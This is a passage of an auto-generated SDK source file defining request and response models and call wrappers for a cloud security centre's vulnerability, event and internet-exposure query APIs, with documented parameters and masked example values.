    query['FuzzyDomain'] = request.fuzzyDomain;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeDomainList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeDomainList(request: DescribeDomainListRequest): DescribeDomainListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeDomainListWithOptions(request, runtime);
}

model DescribeEmgUserAgreementResponseBody = {
  auth?: boolean(name='Auth', example='true'),
  requestId?: string(name='RequestId', example='768BB9F5-8AF3-557F-A489-9BDD64CB3E4C'),
}

model DescribeEmgUserAgreementResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEmgUserAgreementResponseBody(name='body'),
}

async function describeEmgUserAgreementWithOptions(runtime: Util.RuntimeOptions): DescribeEmgUserAgreementResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeEmgUserAgreement',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEmgUserAgreement(): DescribeEmgUserAgreementResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEmgUserAgreementWithOptions(runtime);
}

model DescribeEmgVulItemRequest {
  checkType?: int32(name='CheckType', description='The check method. Valid values:

*   **0**: proof of concept (POC) verification
*   **1**: version comparison', example='0'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **10**.', example='10'),
  riskStatus?: string(name='RiskStatus', description='Specifies whether the vulnerability poses risks.\\
If you do not specify this parameter, all vulnerabilities are queried regardless of whether the vulnerabilities pose risks. Valid values:

*   **y**: yes
*   **n**: no', example='y'),
  scanType?: string(name='ScanType', description='The method that is used to detect the vulnerability.\\
If you do not specify this parameter, all vulnerabilities are queried regardless of which method is used. Valid values:

*   **python**: The Version method is used. Security Center checks the software versions of your server to check whether disclosed vulnerabilities exist on your server.
*   **scan**: The Network Scan method is used. Security Center analyzes the access traffic to your server over the Internet to check whether vulnerabilities exist on your server.', example='python'),
  vulName?: string(name='VulName', description='The name of the urgent vulnerability.', example='Changjietong T + SetupAccount/Upload.aspx file Upload vulnerability (CNVD-2022-60632)'),
}

model DescribeEmgVulItemResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Pages start from page **1**. Default value: **1**.', example='1'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The name of the urgent vulnerability.', example='Changjietong T + SetupAccount/Upload.aspx file Upload vulnerability (CNVD-2022-60632)'),
      checkType?: int32(name='CheckType', description='The check method.', example='1'),
      gmtLastCheck?: long(name='GmtLastCheck', description='The timestamp when the urgent vulnerability was last detected. Unit: milliseconds.', example='1619286031000'),
      gmtPublish?: long(name='GmtPublish', description='The timestamp when the vulnerability was disclosed. Unit: milliseconds.', example='1618887687000'),
      name?: string(name='Name', description='The name of the detection rule.', example='scan:AVD-2021-179344'),
      pendingCount?: int32(name='PendingCount', description='The number of unhandled urgent vulnerabilities.', example='0'),
      progress?: int32(name='Progress', description='The progress of the urgent vulnerability detection task. Valid values: 0 to 100.

>  This parameter is returned only when an urgent vulnerability is being detected.', example='50'),
      status?: int32(name='Status', description='The detection status of the urgent vulnerability. Valid values:

*   **10**: The urgent vulnerability is not detected.
*   **20**: The urgent vulnerability is being detected.
*   **30**: The urgent vulnerability detection is complete.', example='30'),
      type?: string(name='Type', description='The method that is used to detect the urgent vulnerability. Valid values:

*   **python**: The Version method is used. Security Center checks the software versions of your server to check whether disclosed vulnerabilities exist on your server.
*   **scan**: The Network Scan method is used. Security Center analyzes the access traffic to your server over the Internet to check whether vulnerabilities exist on your server.', example='scan'),
    }
  ](name='GroupedVulItems', description='An array that consists of the urgent vulnerabilities returned.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **10**.', example='10'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BC1868ED-A0E1-4D1C-BF7E-10DC0C34B3C3'),
  totalCount?: int32(name='TotalCount', description='The total number of the urgent vulnerabilities returned.', example='1'),
}

model DescribeEmgVulItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEmgVulItemResponseBody(name='body'),
}

async function describeEmgVulItemWithOptions(request: DescribeEmgVulItemRequest, runtime: Util.RuntimeOptions): DescribeEmgVulItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkType)) {
    query['CheckType'] = request.checkType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskStatus)) {
    query['RiskStatus'] = request.riskStatus;
  }
  if (!Util.isUnset(request.scanType)) {
    query['ScanType'] = request.scanType;
  }
  if (!Util.isUnset(request.vulName)) {
    query['VulName'] = request.vulName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEmgVulItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEmgVulItem(request: DescribeEmgVulItemRequest): DescribeEmgVulItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEmgVulItemWithOptions(request, runtime);
}

model DescribeEventLevelCountRequest {
  clusterId?: string(name='ClusterId', example='c7e3c5b420a7947c2933303144688****'),
  containerFieldName?: string(name='ContainerFieldName', example='clusterId'),
  containerFieldValue?: string(name='ContainerFieldValue', example='c951761046a9c4afe92be0a7b5bexxxxx'),
  containerIds?: string(name='ContainerIds', example='xxxxxx30389a10c28f6d38f2398f0dcexxxxxxx922b9e8290dc7c3019d4a8,48b87f2c0662e334820f436cb9133f1ae4e053d39b6fad42xxxxxxxxxx'),
  from?: string(name='From', example='sas'),
  targetType?: string(name='TargetType', example='uuid'),
}

model DescribeEventLevelCountResponseBody = {
  code?: string(name='Code', example='200'),
  eventLevels?: {
    remind?: int32(name='Remind', example='2'),
    serious?: int32(name='Serious', example='0'),
    suspicious?: int32(name='Suspicious', example='1'),
  }(name='EventLevels'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='CE8CA5EA-24EF-5D41-B735-53ACE7XXXXX'),
  success?: boolean(name='Success', example='true'),
}

model DescribeEventLevelCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEventLevelCountResponseBody(name='body'),
}

async function describeEventLevelCountWithOptions(request: DescribeEventLevelCountRequest, runtime: Util.RuntimeOptions): DescribeEventLevelCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.containerIds)) {
    query['ContainerIds'] = request.containerIds;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEventLevelCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEventLevelCount(request: DescribeEventLevelCountRequest): DescribeEventLevelCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEventLevelCountWithOptions(request, runtime);
}

model DescribeEventOnStageRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeEventOnStageResponseBody = {
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E332241XXXXX'),
  securityEventStageResponse?: {
    securityEventOnStag?: map[string]any(name='SecurityEventOnStag'),
  }(name='SecurityEventStageResponse'),
}

model DescribeEventOnStageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeEventOnStageResponseBody(name='body'),
}

async function describeEventOnStageWithOptions(request: DescribeEventOnStageRequest, runtime: Util.RuntimeOptions): DescribeEventOnStageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeEventOnStage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeEventOnStage(request: DescribeEventOnStageRequest): DescribeEventOnStageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeEventOnStageWithOptions(request, runtime);
}

model DescribeExcludeSystemPathRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeExcludeSystemPathResponseBody = {
  excludePaths?: [ 
    {
      os?: string(name='Os', example='linux'),
      path?: string(name='Path', example='/bin/'),
    }
  ](name='ExcludePaths'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='55'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='FBBEB173-1F43-505F-A876-C03ECDF6****'),
}

model DescribeExcludeSystemPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExcludeSystemPathResponseBody(name='body'),
}

async function describeExcludeSystemPathWithOptions(request: DescribeExcludeSystemPathRequest, runtime: Util.RuntimeOptions): DescribeExcludeSystemPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExcludeSystemPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExcludeSystemPath(request: DescribeExcludeSystemPathRequest): DescribeExcludeSystemPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExcludeSystemPathWithOptions(request, runtime);
}

model DescribeExportInfoRequest {
  exportId?: long(name='ExportId', description='The ID of the export task.', example='111'),
}

model DescribeExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', description='The number of exported entries.', example='1'),
  exportStatus?: string(name='ExportStatus', description='The status of the export task.

Valid values:

*   **init**: The task is being initialized.
*   **exporting**: The task is in progress.
*   **success**: The task is complete.', example='success'),
  fileName?: string(name='FileName', description='The name of the exported Excel file.', example='health_check_export_20171123'),
  id?: long(name='Id', description='The ID of the export task.', example='11'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://www.aliyun.com'),
  message?: string(name='Message', description='The message that shows the task result.

The value is fixed as success, which indicates that the export task is complete.', example='success'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BBB9-AFA1A032756C'),
  totalCount?: int32(name='TotalCount', description='The total number of entries in the exported Excel file.', example='1'),
}

model DescribeExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExportInfoResponseBody(name='body'),
}

async function describeExportInfoWithOptions(request: DescribeExportInfoRequest, runtime: Util.RuntimeOptions): DescribeExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExportInfo(request: DescribeExportInfoRequest): DescribeExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExportInfoWithOptions(request, runtime);
}

model DescribeExposedCheckWarningRequest {
  lang?: string(name='Lang', example='zh'),
  typeName?: string(name='TypeName', example='weak_password'),
  uuids?: string(name='Uuids', example='6541631a-7d47-41fd-9fef-9518113f****'),
}

model DescribeExposedCheckWarningResponseBody = {
  count?: int32(name='Count', example='10'),
  requestId?: string(name='RequestId', example='6D9CDB47-6191-4415-BE63-7E8B12CD****'),
  warningList?: [ 
    {
      riskId?: long(name='RiskId', example='107'),
      riskName?: string(name='RiskName', example='Weak password-Redis DB login weak password baseline'),
      subTypeAlias?: string(name='SubTypeAlias', example='Redis DB login weak password baseline'),
      typeAlias?: string(name='TypeAlias', example='Weak password'),
      uuid?: string(name='Uuid', example='1d35b031-ee4e-4e53-8b53-465ab712****'),
    }
  ](name='WarningList'),
}

model DescribeExposedCheckWarningResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedCheckWarningResponseBody(name='body'),
}

async function describeExposedCheckWarningWithOptions(request: DescribeExposedCheckWarningRequest, runtime: Util.RuntimeOptions): DescribeExposedCheckWarningResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedCheckWarning',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedCheckWarning(request: DescribeExposedCheckWarningRequest): DescribeExposedCheckWarningResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedCheckWarningWithOptions(request, runtime);
}

model DescribeExposedInstanceCriteriaRequest {
  value?: string(name='Value', description='The value of the search condition. Fuzzy match is supported.', example='id'),
}

model DescribeExposedInstanceCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition.', example='instanceId'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: You must configure the search condition.
*   **select**: You must select a search condition from the **Values** list.', example='select'),
      values?: string(name='Values', description='The value of the search condition. This parameter is returned only when the value of the **Type** parameter is **select**.

>  If the value of the **Type** parameter is **input**, this parameter is empty.', example='i-bp19r0fdd39idxhf****'),
    }
  ](name='CriteriaList', description='The search conditions that are used to search for exposed assets.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D9CDB47-6191-4415-BE63-7E8B12CD4FBE'),
}

model DescribeExposedInstanceCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceCriteriaResponseBody(name='body'),
}

async function describeExposedInstanceCriteriaWithOptions(request: DescribeExposedInstanceCriteriaRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedInstanceCriteria(request: DescribeExposedInstanceCriteriaRequest): DescribeExposedInstanceCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceCriteriaWithOptions(request, runtime);
}

model DescribeExposedInstanceDetailRequest {
  uuid?: string(name='Uuid', description='The UUID of the server that is exposed on the Internet.

>  You can call the [DescribeExposedInstanceList](~~DescribeExposedInstanceList~~) operation to query the UUIDs of servers.', example='fc82b966-4d70-4e01-bf4f-aa4076a5****'),
}

model DescribeExposedInstanceDetailResponseBody = {
  exposedChains?: [ 
    {
      allVulList?: [ 
        {
          aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
          name?: string(name='Name', description='The name of the vulnerability.', example='SCA:ACSV-2020-052801'),
          necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

>  We recommend that you fix the vulnerabilities that have the **high** priority at the earliest opportunity.', example='asap'),
          type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerabilities
*   **sys**: Windows system vulnerabilities
*   **cms**: Web-CMS vulnerabilities
*   **app**: application vulnerabilities
*   **emg**: urgent vulnerabilities
*   **sca**: middleware vulnerabilities', example='sca'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
        }
      ](name='AllVulList', description='The information about all vulnerabilities on the server.'),
      exposureComponent?: string(name='ExposureComponent', description='The server component that is exposed on the Internet.', example='openssl,openssh'),
      exposureIp?: string(name='ExposureIp', description='The public IP address.', example='47.99.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='The resource from which the server is exposed. Valid values:

*   **INTERNET_IP**: the public IP address of an Elastic Compute Service (ECS) instance
*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **EIP**: an elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='INTERNET_IP'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the value of the ExposureType parameter.

*   If the value of the ExposureType parameter is **INTERNET_IP**, the value of this parameter is an empty string.
*   If the value of the ExposureType parameter is **SLB**, the value of this parameter is the ID of the Internet-facing SLB instance.
*   If the value of the ExposureType parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the ExposureType parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.', example='eip-bp1bkgowzam49rld3****'),
      groupNo?: string(name='GroupNo', description='The server group to which the server belongs.', example='sg-bp1iw5enua6gf5i2xr7z'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp116qem8npvchqc****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='worker-k8s-for-cs-c929ee2a145214f89a8b248005be5****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.99.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      realVulList?: [ 
        {
          aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2022:0274-Important: polkit pkexec Local Privilege Escalation Vulnerability(CVE-2021-4034)'),
          name?: string(name='Name', description='The name of the vulnerability.', example='SCA:ACSV-2020-052801'),
          necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high
*   **later**: medium
*   **nntf**: low

>  We recommend that you fix the vulnerabilities that have the **high** priority at the earliest opportunity.', example='asap'),
          type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: Linux software vulnerabilities
*   **sys**: Windows system vulnerabilities
*   **cms**: Web-CMS vulnerabilities
*   **app**: application vulnerabilities
*   **emg**: urgent vulnerabilities
*   **sca**: middleware vulnerabilities', example='sca'),
          uuid?: string(name='Uuid', description='The UUID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
        }
      ](name='RealVulList', description='The information about the vulnerabilities that are exposed on the Internet and can be exploited by attackers.'),
      regionId?: string(name='RegionId', description='The region in which the server resides.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='4f9ce097-4a7d-48fe-baef-6960e5b6****'),
    }
  ](name='ExposedChains', description='The exposure details about the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C590482B-54A7-4273-8115-9DBE2DE46B26'),
}

model DescribeExposedInstanceDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceDetailResponseBody(name='body'),
}

async function describeExposedInstanceDetailWithOptions(request: DescribeExposedInstanceDetailRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedInstanceDetail(request: DescribeExposedInstanceDetailRequest): DescribeExposedInstanceDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceDetailWithOptions(request, runtime);
}

model DescribeExposedInstanceListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  exposureComponent?: string(name='ExposureComponent', description='The server component that is exposed on the Internet.', example='openssl'),
  exposureIp?: string(name='ExposureIp', description='The public IP address of the server.', example='116.12.XX.XX'),
  exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
  groupId?: long(name='GroupId', description='The ID of the server group.

> You can call the [DescribeAllGroups](~~DescribeAllGroups~~) operation to query the IDs of server groups.', example='9535356'),
  healthStatus?: boolean(name='HealthStatus', description='The health status of the Elastic Compute Service (ECS) instance in the scaling group. ECS instances that are not in the Running state are considered unhealthy. Valid values:

*   Healthy
*   Unhealthy

Auto Scaling automatically removes unhealthy ECS instances from the scaling group and then releases the automatically created instances among the unhealthy instances.

Unhealthy ECS instances that are manually added to the scaling group are released based on the management mode of the instance lifecycle. If the lifecycle of the ECS instances is not managed by the scaling group, Auto Scaling removes the instances from the scaling group but does not release them. If the lifecycle of the ECS instances is managed by the scaling group, Auto Scaling removes the instances from the scaling group and releases them.

>  Make sure that you have sufficient balance within your account. If you have overdue payments in your account, pay-as-you-go and preemptible instances are stopped or released. For information about how the status of ECS instances changes when you have overdue payments in your account, see [Overdue payments](~~170589~~).', example='Unhealthy'),
  instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp1g6wxdwps7s9dz****'),
  instanceName?: string(name='InstanceName', description='The name of the server.', example='abc_centos7.2_005'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='20'),
  vulStatus?: boolean(name='VulStatus', description='Specifies whether the server has vulnerabilities. Valid values:

*   **true**: The server has vulnerabilities.
*   **false**: The server does not have vulnerabilities.', example='true'),
}

model DescribeExposedInstanceListResponseBody = {
  exposedInstances?: [ 
    {
      asapVulCount?: int32(name='AsapVulCount', description='The number of high-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      exploitHealthCount?: int32(name='ExploitHealthCount', description='The total number of servers that are exposed on the Internet.', example='0'),
      exposureComponent?: string(name='ExposureComponent', description='The server component that is exposed on the Internet.', example='openssl,openssh'),
      exposureIp?: string(name='ExposureIp', description='The public IP address that is exposed on the Internet.', example='116.12.XX.XX'),
      exposurePort?: string(name='ExposurePort', description='The port that is exposed on the Internet.', example='22'),
      exposureType?: string(name='ExposureType', description='The resource from which the asset is exposed. Valid values:

*   **INTERNET_IP**: the public IP address of an ECS instance
*   **SLB**: the public IP address of a Server Load Balancer (SLB) instance
*   **EIP**: an elastic IP address (EIP)
*   **DNAT**: the NAT gateway that connects to the Internet by using the DNAT feature', example='INTERNET_IP'),
      exposureTypeId?: string(name='ExposureTypeId', description='The ID of the instance to which the resource belongs. The valid values of this parameter vary based on the ExposureType parameter.

*   If the value of the ExposureType parameter is **INTERNET_IP**, this parameter is empty.
*   If the value of the ExposureType parameter is **SLB**, the value of this parameter is the ID of the SLB instance.
*   If the value of the ExposureType parameter is **EIP**, the value of this parameter is the ID of the EIP.
*   If the value of the ExposureType parameter is **DNAT**, the value of this parameter is the ID of the NAT gateway.', example='i-ew11313a****'),
      groupId?: long(name='GroupId', description='The ID of the server group.', example='9469268'),
      groupName?: string(name='GroupName', description='The name of the server group.', example='testGroup'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp1g6wxdwps7s9dz****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='abc_centos7.2_005'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='116.12.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
      laterVulCount?: int32(name='LaterVulCount', description='The number of medium-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      nntfVulCount?: int32(name='NntfVulCount', description='The number of low-severity vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      regionId?: string(name='RegionId', description='The ID of the region where the server resides.

>  For more information about the mapping between region IDs and region names, see [Regions and zones](~~40654~~).', example='cn-hangzhou'),
      totalVulCount?: int32(name='TotalVulCount', description='The total number of vulnerabilities that are exposed on the Internet and can be exploited by attackers.', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='dd803d9e-a337-4add-9c5b-7d503e08****'),
    }
  ](name='ExposedInstances', description='An array that consists of the details about the exposed asset.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries about the servers that are exposed on the Internet.', example='2'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='598A4A61-ABA7-456B-8725-7378258276D9'),
}

model DescribeExposedInstanceListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeExposedInstanceListResponseBody(name='body'),
}

async function describeExposedInstanceListWithOptions(request: DescribeExposedInstanceListRequest, runtime: Util.RuntimeOptions): DescribeExposedInstanceListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.exposureComponent)) {
    query['ExposureComponent'] = request.exposureComponent;
  }
  if (!Util.isUnset(request.exposureIp)) {
    query['ExposureIp'] = request.exposureIp;
  }
  if (!Util.isUnset(request.exposurePort)) {
    query['ExposurePort'] = request.exposurePort;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.healthStatus)) {
    query['HealthStatus'] = request.healthStatus;
  }
  if (!Util.isUnset(request.instanceId)) {
    query['InstanceId'] = request.instanceId;
  }
  if (!Util.isUnset(request.instanceName)) {
    query['InstanceName'] = request.instanceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.vulStatus)) {
    query['VulStatus'] = request.vulStatus;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeExposedInstanceList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeExposedInstanceList(request: DescribeExposedInstanceListRequest): DescribeExposedInstanceListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeExposedInstanceListWithOptions(request, runtime);
}

model DescribeExposedStatisticsResponseBody = {
  exposedAsapVulCount?: int32(name='ExposedAsapVulCount'),
